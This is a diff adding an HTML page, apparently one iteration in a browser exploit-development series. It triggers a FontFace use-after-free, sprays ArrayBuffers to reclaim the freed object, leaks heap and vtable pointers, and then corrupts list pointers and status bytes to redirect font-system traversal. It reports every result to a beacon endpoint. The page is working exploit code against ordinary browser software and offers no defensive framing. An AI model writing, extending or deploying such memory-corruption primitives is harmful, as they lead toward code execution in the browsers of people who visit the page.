@@ -1,0 +1,442 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P848</title>
+<style>
+body{background:#0d1117;color:#c9d1d9;font:11px monospace;margin:8px;}
+pre{color:#7ee787;background:#161b22;border:1px solid #30363d;padding:6px;border-radius:4px;white-space:pre-wrap;word-break:break-all;max-height:93vh;overflow-y:auto;}
+.ok{color:#3fb950;}.fail{color:#f85149;}.info{color:#58a6ff;}.hot{color:#ffa657;font-weight:bold;}
+</style>
+</head><body>
+<pre id="o">P848: Pointer Injection Oracle</pre>
+<script>
+'use strict';
+var O=document.getElementById('o');
+function log(s,c){var sp=document.createElement('span');sp.className=c||'';sp.textContent='\n'+s;O.appendChild(sp);}
+function bn(t,d){
+  try{var x=new XMLHttpRequest();
+  x.open('GET','/beacon.php?tag=P848-'+encodeURIComponent(t)+'&data='+encodeURIComponent(String(d||'').slice(0,900))+'&t='+Date.now(),false);
+  x.send();}catch(e){}
+}
+function hexQ(v){return '0x'+v.toString(16).padStart(16,'0');}
+function classifyPtr(v){
+  if(v===BigInt(0))return 'Z';
+  var hi=Number(v>>BigInt(32));
+  if(hi>=0xFFFF8000)return 'K';
+  if(hi>=0x10&&hi<=0x1000)return 'H';
+  if(hi===0&&Number(v&BigInt(0xFFFFFFFF))>0x10000)return 'C';
+  if(hi>0&&hi<0x10)return 'C';
+  if(v<BigInt(0x10000))return 'S';
+  return '?';
+}
+
+bn('BOOT','start');
+log('Pointer injection oracle starting...','info');
+log('Goal: redirect font system traversal toward q13 vtable','info');
+log('','');
+
+/* ===================================================================
+   PHASE A: Standard FontFace UAF (proven pattern)
+   Get H, q11, q13 baseline
+   =================================================================== */
+
+var fontAB=null, fabsA=[], face=null;
+var BU=null, H=BigInt(0), q11=BigInt(0), q13=BigInt(0);
+
+var stA=document.createElement('style');
+stA.textContent="@font-face{font-family:bbA;src:local(Arial);unicode-range:U+0042;}";
+document.head.appendChild(stA);
+
+face=new FontFace('fA',"local('Helvetica')",{unicodeRange:'U+0041'});
+document.fonts.add(face);
+void face.loaded;
+
+var ffiredA=false;
+Object.defineProperty(FontFace.prototype,'then',{
+  configurable:true,
+  get:function(){
+    if(ffiredA)return undefined;
+    ffiredA=true;
+    if(stA){stA.remove();stA.textContent='';stA=null;}
+    try{document.fonts.delete(this);}catch(e){}
+    document.body.offsetHeight;
+    fabsA=[];
+    for(var i=0;i<80;i++)fabsA.push(new ArrayBuffer(192));
+    try{document.fonts.check('1em bbA');}catch(e){}
+    document.body.offsetHeight;
+    return undefined;
+  },set:function(){}
+});
+
+document.fonts.load('1em fA, bbA','AB');
+
+setTimeout(function(){
+  delete FontFace.prototype.then;
+
+  for(var i=0;i<fabsA.length;i++){
+    var bu=new BigUint64Array(fabsA[i]);
+    for(var j=0;j<bu.length;j++){
+      if(bu[j]!==BigInt(0)){fontAB=fabsA[i];break;}
+    }
+    if(fontAB)break;
+  }
+
+  if(!fontAB){
+    bn('A-MISS','no-hit');
+    log('FontFace UAF MISS','fail');
+    bn('DONE','a-miss');
+    return;
+  }
+
+  BU=new BigUint64Array(fontAB);
+  H=BU[11]-BigInt(0x68);
+  q11=BU[11];
+  q13=BU[13];
+
+  log('--- PHASE A: FontFace UAF ---','ok');
+  log('H = '+hexQ(H),'ok');
+  log('q11 = '+hexQ(q11)+' (list ptr, = H+0x68)','ok');
+  log('q13 = '+hexQ(q13)+' (CSSFontSelector*)','ok');
+  bn('A-HIT','H='+hexQ(H)+'|q11='+hexQ(q11)+'|q13='+hexQ(q13));
+
+  /* Save full baseline */
+  var baseline=new BigUint64Array(24);
+  for(var i=0;i<24;i++)baseline[i]=BU[i];
+
+  /* Helper: restore baseline */
+  function restore(){for(var i=0;i<24;i++)BU[i]=baseline[i];}
+
+  /* Helper: diff against baseline, return changed qwords */
+  function diffAB(){
+    var changes=[];
+    for(var i=0;i<24;i++){
+      if(BU[i]!==baseline[i]){
+        var cls=classifyPtr(BU[i]);
+        changes.push({q:i,old:baseline[i],now:BU[i],cls:cls});
+      }
+    }
+    return changes;
+  }
+
+  /* ===================================================================
+     PHASE B: q11 Injection — redirect list traversal
+
+     q11 (+0x58) appears to be a linked-list pointer (points to H+0x68 = q13's address).
+     If fonts.check() traverses this list, redirecting q11 lets us control WHERE it reads next.
+
+     Test: point q11 at various targets, call fonts.check(), scan for new data.
+     =================================================================== */
+  log('','');
+  log('--- PHASE B: q11 list injection ---','hot');
+
+  var bResults=[];
+
+  /* B1: q11 = 0 (null-terminate list) */
+  restore();
+  BU[11]=BigInt(0);
+  var b1err=null;
+  try{document.fonts.check('1em fA');}catch(e){b1err=e.name;}
+  var b1diff=diffAB();
+  bResults.push('null:'+(b1err||'ok')+'d'+b1diff.length);
+  log('  B1 q11=0: '+(b1err||'ok')+', diff='+b1diff.length, b1diff.length?'hot':'info');
+  for(var d=0;d<b1diff.length;d++){
+    var dd=b1diff[d];
+    log('    q'+dd.q+' '+hexQ(dd.old)+'→'+hexQ(dd.now)+' ['+dd.cls+']',dd.cls==='C'?'hot':'ok');
+  }
+
+  /* B2: q11 = H (self-loop → font system reads CSSFontFace header again) */
+  restore();
+  BU[11]=H;
+  var b2err=null;
+  try{document.fonts.check('1em fA');}catch(e){b2err=e.name;}
+  var b2diff=diffAB();
+  bResults.push('self:'+(b2err||'ok')+'d'+b2diff.length);
+  log('  B2 q11=H: '+(b2err||'ok')+', diff='+b2diff.length, b2diff.length?'hot':'info');
+  for(var d=0;d<b2diff.length;d++){
+    var dd=b2diff[d];
+    log('    q'+dd.q+' '+hexQ(dd.old)+'→'+hexQ(dd.now)+' ['+dd.cls+']',dd.cls==='C'?'hot':'ok');
+  }
+
+  /* B3: q11 = q13 (redirect to CSSFontSelector → vtable at [q13+0]) */
+  restore();
+  BU[11]=q13;
+  var b3err=null;
+  try{document.fonts.check('1em fA');}catch(e){b3err=e.name;}
+  var b3diff=diffAB();
+  bResults.push('q13:'+(b3err||'ok')+'d'+b3diff.length);
+  log('  B3 q11=q13: '+(b3err||'ok')+', diff='+b3diff.length, b3diff.length?'hot':'info');
+  for(var d=0;d<b3diff.length;d++){
+    var dd=b3diff[d];
+    log('    q'+dd.q+' '+hexQ(dd.old)+'→'+hexQ(dd.now)+' ['+dd.cls+']',dd.cls==='C'?'hot':'ok');
+  }
+
+  /* B4: q11 = q13 - 0x58 (so that the "q11" read at the target's +0x58 = q13's vtable!) */
+  restore();
+  BU[11]=q13-BigInt(0x58);
+  var b4err=null;
+  try{document.fonts.check('1em fA');}catch(e){b4err=e.name;}
+  var b4diff=diffAB();
+  bResults.push('q13-58:'+(b4err||'ok')+'d'+b4diff.length);
+  log('  B4 q11=q13-0x58: '+(b4err||'ok')+', diff='+b4diff.length, b4diff.length?'hot':'info');
+  for(var d=0;d<b4diff.length;d++){
+    var dd=b4diff[d];
+    log('    q'+dd.q+' '+hexQ(dd.old)+'→'+hexQ(dd.now)+' ['+dd.cls+']',dd.cls==='C'?'hot':'ok');
+  }
+
+  bn('B',bResults.join('|'));
+  restore();
+
+  /* ===================================================================
+     PHASE C: face.load() with extended status values
+
+     Status byte is at +130 (0x82). P846v4 tested 0-4.
+     Try values 5-15 — higher values might trigger DIFFERENT code paths
+     that follow pointers (error recovery, retry logic, etc.)
+     =================================================================== */
+  log('','');
+  log('--- PHASE C: Extended status values ---','hot');
+
+  var u8=new Uint8Array(fontAB);
+  var cResults=[];
+
+  for(var s=0;s<=15;s++){
+    restore();
+    u8[130]=s;
+    var snap=new BigUint64Array(24);
+    for(var i=0;i<24;i++)snap[i]=BU[i];
+    var cerr=null;
+    try{face.load();}catch(e){cerr=e.name;}
+    var cChg=[];
+    for(var i=0;i<24;i++){
+      if(BU[i]!==snap[i]){
+        cChg.push({q:i,old:snap[i],now:BU[i],cls:classifyPtr(BU[i])});
+      }
+    }
+    var tag=(cChg.length>1||cChg.some(function(c){return c.cls==='C';}))?'hot':
+            (cChg.length?'ok':'');
+    if(s<=4||cChg.length>0||cerr){
+      log('  s='+s+': '+(cerr||'ok')+' chg='+cChg.length+
+        (cChg.length?' '+cChg.map(function(c){return 'q'+c.q+'['+c.cls+']';}).join(','):''),tag);
+    }
+    cResults.push('s'+s+(cerr?'E':'')+'c'+cChg.length+
+      (cChg.some(function(c){return c.cls==='C';})?'*':''));
+  }
+  bn('C',cResults.join('|'));
+  restore();
+
+  /* ===================================================================
+     PHASE D: Aggressive mass style destruction
+
+     Create 20 separate <style> elements each with @font-face,
+     append them all, force layout, then destroy them all in one
+     synchronous burst + immediate multi-size spray.
+
+     More styles = more MutableStyleProperties/CSSStyleSheet/
+     CSSFontFaceRule objects freed at once = better chance of
+     one landing in our spray BEFORE zeroing.
+     =================================================================== */
+  log('','');
+  log('--- PHASE D: Mass style burst ---','hot');
+
+  var massStyles=[];
+  for(var m=0;m<20;m++){
+    var ms=document.createElement('style');
+    ms.textContent="@font-face{font-family:ms"+m+";src:local(Arial);unicode-range:U+00"+(0x60+m).toString(16)+";font-weight:"+(100+m*50)+";}";
+    document.head.appendChild(ms);
+    massStyles.push(ms);
+  }
+  document.body.offsetHeight;
+
+  /* Create new FontFace for the trigger */
+  var face2=new FontFace('fD',"local('Helvetica')",{unicodeRange:'U+0047'});
+  document.fonts.add(face2);
+  void face2.loaded;
+
+  var dFired=false;
+  Object.defineProperty(FontFace.prototype,'then',{
+    configurable:true,
+    get:function(){
+      if(dFired)return undefined;
+      dFired=true;
+      /* Destroy ALL 20 styles at once */
+      for(var m=0;m<massStyles.length;m++){
+        massStyles[m].remove();
+        massStyles[m].textContent='';
+      }
+      massStyles=[];
+      try{document.fonts.delete(this);}catch(e){}
+      document.body.offsetHeight;
+
+      /* Massive spray across many sizes */
+      var dSizes=[32,48,64,80,96,112,128,160,192,224,256,320,384,512,640,768];
+      var dABs={};
+      for(var si=0;si<dSizes.length;si++){
+        var sz=dSizes[si];
+        dABs[sz]=[];
+        for(var i=0;i<100;i++)dABs[sz].push(new ArrayBuffer(sz));
+      }
+      try{document.fonts.check('1em ms0');}catch(e){}
+      document.body.offsetHeight;
+
+      window.__dABs=dABs;
+      window.__dSizes=dSizes;
+      return undefined;
+    },set:function(){}
+  });
+
+  document.fonts.load('1em fD, ms0','GH');
+
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+
+    var dABs=window.__dABs||{};
+    var dSizes=window.__dSizes||[];
+    var dHits=[];
+    var dCodeHits=[];
+
+    for(var si=0;si<dSizes.length;si++){
+      var sz=dSizes[si];
+      var arr=dABs[sz]||[];
+      var nz=0,cc=0,hc=0;
+      for(var i=0;i<arr.length;i++){
+        var bu=new BigUint64Array(arr[i]);
+        var hasNZ=false;
+        for(var j=0;j<bu.length;j++){
+          if(bu[j]!==BigInt(0)){
+            hasNZ=true;
+            var cls=classifyPtr(bu[j]);
+            if(cls==='C'){cc++;dCodeHits.push({sz:sz,idx:i,qw:j,val:bu[j],off:j*8});}
+            if(cls==='H')hc++;
+          }
+        }
+        if(hasNZ)nz++;
+      }
+      if(nz>0){
+        dHits.push('sz'+sz+'='+nz+'(c'+cc+',h'+hc+')');
+        log('  AB('+sz+'): '+nz+' hit, '+cc+' CODE, '+hc+' HEAP',cc?'hot':(nz?'ok':''));
+      }
+    }
+
+    if(dHits.length===0){
+      log('  Mass burst: all zeroed (20 styles)','fail');
+      bn('D-MISS','0hits');
+    } else {
+      bn('D-HITS',dHits.join('|'));
+    }
+
+    if(dCodeHits.length>0){
+      log('','');
+      log('  *** MASS BURST CODE POINTERS! ***','hot');
+      for(var ci=0;ci<dCodeHits.length&&ci<10;ci++){
+        var ch=dCodeHits[ci];
+        log('    AB('+ch.sz+')['+ch.idx+'] q'+ch.qw+' +0x'+(ch.off).toString(16)+' = '+hexQ(ch.val),'hot');
+      }
+      bn('D-CODE',dCodeHits.slice(0,5).map(function(c){return 'sz'+c.sz+'+'+c.off+'='+hexQ(c.val);}).join('|'));
+    }
+
+    /* ===================================================================
+       PHASE E: fonts.check with different family names
+
+       fonts.check('1em fA') looks for our JS-registered FontFace 'fA'.
+       The CSSFontFace has been reclaimed by our AB.
+       Try different family strings to trigger different lookup paths.
+       =================================================================== */
+    log('','');
+    log('--- PHASE E: Family name traversal ---','hot');
+
+    restore();
+    var eResults=[];
+    var families=['fA','bbA','ms0','serif','monospace','Arial','Helvetica','fantasy'];
+
+    for(var fi=0;fi<families.length;fi++){
+      var fam=families[fi];
+      var snap=new BigUint64Array(24);
+      for(var i=0;i<24;i++)snap[i]=BU[i];
+      var eerr=null,eRet=null;
+      try{eRet=document.fonts.check('1em '+fam);}catch(e){eerr=e.name;}
+      var eChg=[];
+      for(var i=0;i<24;i++){
+        if(BU[i]!==snap[i])eChg.push({q:i,cls:classifyPtr(BU[i])});
+      }
+      if(eerr||eChg.length>0){
+        log('  "'+fam+'": '+(eerr||'ret='+eRet)+' chg='+eChg.length,eChg.length?'ok':'info');
+        eResults.push(fam+':'+(eerr||String(eRet))+'c'+eChg.length);
+      }
+      restore();
+    }
+
+    if(eResults.length===0){
+      log('  All families: 0 changes','info');
+      bn('E','0changes');
+    } else {
+      bn('E',eResults.join('|'));
+    }
+
+    /* ===================================================================
+       PHASE F: document.fonts iteration
+
+       Iterate document.fonts to see if the FontFaceSet still holds a
+       reference to our freed face. forEach/values/entries might trigger
+       different traversal paths.
+       =================================================================== */
+    log('','');
+    log('--- PHASE F: FontFaceSet iteration ---','hot');
+
+    restore();
+    var fSnap=new BigUint64Array(24);
+    for(var i=0;i<24;i++)fSnap[i]=BU[i];
+
+    var fCount=0;
+    var ferr=null;
+    try{
+      document.fonts.forEach(function(f){
+        fCount++;
+        /* Try accessing properties on each font face */
+        try{var s=f.status;}catch(e){}
+        try{var fam=f.family;}catch(e){}
+      });
+    }catch(e){ferr=e.name;}
+
+    var fChg=[];
+    for(var i=0;i<24;i++){
+      if(BU[i]!==fSnap[i])fChg.push({q:i,cls:classifyPtr(BU[i]),val:BU[i]});
+    }
+
+    log('  forEach: '+(ferr||'ok')+', count='+fCount+', chg='+fChg.length,
+      fChg.length?'hot':'info');
+    for(var d=0;d<fChg.length;d++){
+      log('    q'+fChg[d].q+' → '+hexQ(fChg[d].val)+' ['+fChg[d].cls+']',
+        fChg[d].cls==='C'?'hot':'ok');
+    }
+    bn('F','count='+fCount+'|chg='+fChg.length+(fChg.length?'|'+fChg.map(function(c){return 'q'+c.q+'['+c.cls+']';}).join(','):''));
+
+    /* Also try face.loaded promise */
+    restore();
+    var gSnap=new BigUint64Array(24);
+    for(var i=0;i<24;i++)gSnap[i]=BU[i];
+    var gerr=null;
+    try{
+      face.loaded.then(function(){}).catch(function(){});
+    }catch(e){gerr=e.name;}
+
+    /* Give promise microtask a tick */
+    setTimeout(function(){
+      var gChg=[];
+      for(var i=0;i<24;i++){
+        if(BU[i]!==gSnap[i])gChg.push({q:i,cls:classifyPtr(BU[i]),val:BU[i]});
+      }
+      log('  face.loaded: '+(gerr||'ok')+', chg='+gChg.length,gChg.length?'hot':'info');
+      for(var d=0;d<gChg.length;d++){
+        log('    q'+gChg[d].q+' → '+hexQ(gChg[d].val)+' ['+gChg[d].cls+']',
+          gChg[d].cls==='C'?'hot':'ok');
+      }
+      bn('G','loaded-chg='+gChg.length);
+
+      restore();
+      log('','');
+      log('====== P848 COMPLETE ======','hot');
+      bn('DONE','complete');
+    },100);
+  },500);
+},100);
+</script></body></html>
